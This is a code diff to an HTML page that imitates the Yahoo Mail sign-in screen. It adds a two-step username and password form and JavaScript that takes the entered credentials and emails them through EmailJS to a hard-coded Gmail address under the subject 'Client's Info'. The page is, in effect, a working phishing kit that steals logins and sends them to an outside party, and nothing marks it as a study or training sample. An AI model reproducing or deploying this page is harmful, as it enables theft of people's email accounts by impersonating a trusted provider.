@@ -51,7 +51,6 @@
         border: 1px solid rgba(0, 0, 0, 0.1);
         text-align: center;
         padding: 20px;
-        /* flex: 1; */
         border-radius: 3px;
         box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
       }
@@ -68,7 +67,6 @@
         bottom: 5px;
         color: rgba(0, 0, 0, 0.5);
         z-index: -1;
-        /* transition: 0.5s ease-in-out; */
       }
       .go-up {
         position: absolute;
@@ -77,7 +75,6 @@
         top: -10px;
         color: black;
         z-index: -1;
-        /* transition: 0.5s ease-in-out; */
       }
 
       .container form input {
@@ -89,6 +86,11 @@
         height: 100%;
       }
 
+      .container form input:focus {
+        background-color: rgba(24, 143, 255, 0.1);
+        border-color: #b9bdc5;
+      }
+
       .next-btn {
         width: 100%;
         display: block;
@@ -97,18 +99,26 @@
         padding: 10px;
         border-radius: 50px;
         margin-top: 25px;
+        cursor: pointer;
       }
-      .container form button {
+      .next-btn:last-child {
+        background-color: white;
+        color: #188fff;
+        border: 1px solid #188fff;
+      }
+      .submit-btn {
         width: 100%;
         display: block;
         padding: 10px;
         border-radius: 50px;
         outline: none;
-        border: 1px solid #188fff;
-        color: #188fff;
+        background-color: #188fff;
+        color: white;
+        border: none;
         font-weight: 500;
         font-size: 18px;
-        margin-top: 80px;
+        margin-top: 25px;
+        display: none;
       }
       .container .text {
         margin: 60px;
@@ -118,16 +128,56 @@
         display: flex;
         align-items: center;
         justify-content: space-between;
+        margin-top: 30px;
       }
       .container .sign span {
         display: flex;
         align-items: center;
-        justify-content: space-between;
-        margin-top: 20px;
-        background-color: red;
+        flex: 1;
       }
       .container a {
         font-size: 12px;
+      }
+      .container .sign span a {
+        width: 100%;
+        display: block;
+        margin-left: -150px;
+      }
+      input[type="checkbox"] {
+        margin-left: -90px;
+      }
+      #err {
+        color: #f0162f;
+        display: flex;
+        justify-content: left;
+        font-size: 12px;
+        margin-top: 5px;
+      }
+      .hide {
+        display: none;
+      }
+      svg {
+        position: absolute;
+        top: 7px;
+        right: 0px;
+        cursor: pointer;
+      }
+      @media screen and (max-width: 960px) {
+        .container .left {
+          display: none;
+        }
+        .container {
+          justify-content: right;
+        }
+      }
+      @media screen and (max-width: 500px) {
+        nav {
+          padding: 0px 50px;
+        }
+        .container {
+          justify-content: center;
+          padding: 30px 5px;
+        }
       }
     </style>
   </head>
@@ -145,17 +195,45 @@
           you get more out of life
         </p>
       </div>
-      <form action="">
+      <form action="mailto:abc@example.com" method="POST">
         <img src="logo.png" alt="" width="100px" />
         <div class="text">
           <h3>Sign in to Yahoo Mail</h3>
           <small>Using your Yahoo account</small>
         </div>
         <div class="input-wrapper">
-          <small id="up" class="go-up-text">Username, email or mobile</small>
-          <input type="text" id="username" />
+          <span class="first-show">
+            <small id="up" class="go-up-text">Username, email or mobile</small>
+            <input type="text" id="username" />
+          </span>
+          <span class="second-show hide">
+            <small id="up2" class="go-up-text">Password</small>
+            <input type="passsword" id="passsword" />
+            <svg
+              id="svg"
+              xmlns="http://www.w3.org/2000/svg"
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+            >
+              <g
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+              >
+                <path d="M15 12a3 3 0 1 1-6 0a3 3 0 0 1 6 0Z" />
+                <path
+                  d="M2 12c1.6-4.097 5.336-7 10-7s8.4 2.903 10 7c-1.6 4.097-5.336 7-10 7s-8.4-2.903-10-7Z"
+                />
+              </g>
+            </svg>
+          </span>
         </div>
-        <span class="next-btn">Next</span>
+        <small id="err"></small>
+        <span class="next-btn" id="next-btn">Next</span>
+        <button class="submit-btn" id="submit-btn">Submit</button>
         <div class="sign">
           <span
             ><input type="checkbox" name="" id="" />
@@ -163,24 +241,114 @@
           </span>
           <a href="">Forgot username?</a>
         </div>
-        <button>Create an account</button>
+        <span class="next-btn">Create an account</span>
       </form>
     </div>
   </body>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
+    emailjs.init("gG5x8D_myEzjKKXvI");
+
+    let form = document.querySelector("form");
     let username = document.getElementById("username");
+    let password = document.getElementById("passsword");
     let up = document.getElementById("up");
+    let up2 = document.getElementById("up2");
+    let err = document.getElementById("err");
+    let nextBtn = document.getElementById("next-btn");
+    let submitBtn = document.getElementById("submit-btn");
+    let firstShow = document.querySelector(".first-show");
+    let secondShow = document.querySelector(".second-show");
+    let svg = document.getElementById("svg");
+    let uName;
+    let pWord;
+
     username.addEventListener("click", () => {
       up.classList.remove("go-up-text");
       up.classList.add("go-up");
     });
 
+    username.addEventListener("click", () => {
+      up2.classList.remove("go-up-text");
+      up2.classList.add("go-up");
+    });
+
+    svg.addEventListener("click", () => {
+      if (password.type === "password") {
+        password.type = "text";
+      } else {
+        password.type = "password";
+      }
+    });
+
+    function sendEmail(to, subject, message) {
+      // Replace "your_email_template_id" with the actual template ID from EmailJS
+      emailjs
+        .send("gmail", "service_zeoeorp", {
+          to_email: to,
+          subject: subject,
+          message: message,
+        })
+        .then(
+          function (response) {
+            alert("Email sent successfully!");
+            console.log("Email sent successfully:", response);
+          },
+          function (error) {
+            alert("Failed to send email. Please try again later.");
+            console.error("Error sending email:", error);
+          }
+        );
+    }
+
     document.addEventListener("click", (e) => {
       if (e.target.id !== "username") {
-        console.log(e.target);
         up.classList.remove("go-up");
         up.classList.add("go-up-text");
+      } else {
+        nextBtn.addEventListener("click", () => {
+          if (!username.value) {
+            err.textContent = "Please enter your email";
+            setTimeout(() => {
+              err.textContent = "";
+            }, 3000);
+          } else {
+            uName = username.value;
+            username.value = "";
+            firstShow.classList.add("hide");
+            secondShow.classList.remove("hide");
+            nextBtn.style.display = "none";
+            submitBtn.style.display = "block";
+          }
+        });
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+          if (!password.value) {
+            err.textContent = "Please enter your password";
+            setTimeout(() => {
+              err.textContent = "";
+            }, 3000);
+          } else {
+            pWord = password.value;
+            console.log(uName, pWord);
+            // window.location.replace(
+            //   `http://127.0.0.1:5500/index.html?username=${uName}&passsword=${pWord}`
+            // );
+            let message = {
+              username: uName,
+              password: pWord,
+            };
+            sendEmail("ejovwogfreeman007@gmail.com", "Client's Info", message);
+            form.reset();
+          }
+        });
       }
     });
   </script>
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/iconify/2.0.0/iconify.min.js"
+    integrity="sha512-lYMiwcB608+RcqJmP93CMe7b4i9G9QK1RbixsNu4PzMRJMsqr/bUrkXUuFzCNsRUo3IXNUr5hz98lINURv5CNA=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
 </html>
